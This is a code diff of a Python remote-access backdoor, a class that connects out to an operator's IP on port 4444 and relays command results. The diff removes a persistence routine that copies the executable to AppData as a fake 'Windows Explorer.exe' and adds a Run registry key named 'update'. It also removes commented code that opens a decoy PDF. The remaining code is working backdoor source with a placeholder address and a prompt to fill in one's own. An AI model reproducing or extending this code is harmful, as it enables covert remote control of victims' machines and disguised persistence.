@@ -9,15 +9,8 @@ import shutil
  
 class Backdoor:
     def __init__(self, ip, port):
-        # self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
- 
-    def become_persistent(self):
-        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
-        if not os.path.exists(evil_file_location):
-            shutil.copyfile(sys.executable, evil_file_location)
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
  
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -69,9 +62,6 @@ class Backdoor:
  
             self.reliable_send(command_result)
  
- 
-# file_name = sys._MEIPASS + "\sample.pdf"
-# subprocess.Popen(file_name, shell=True)
  
 try:
     my_backdoor = Backdoor("255.255.255.255", 4444) # enter the ip address of your device as the first argument and the port number as the second argument. 
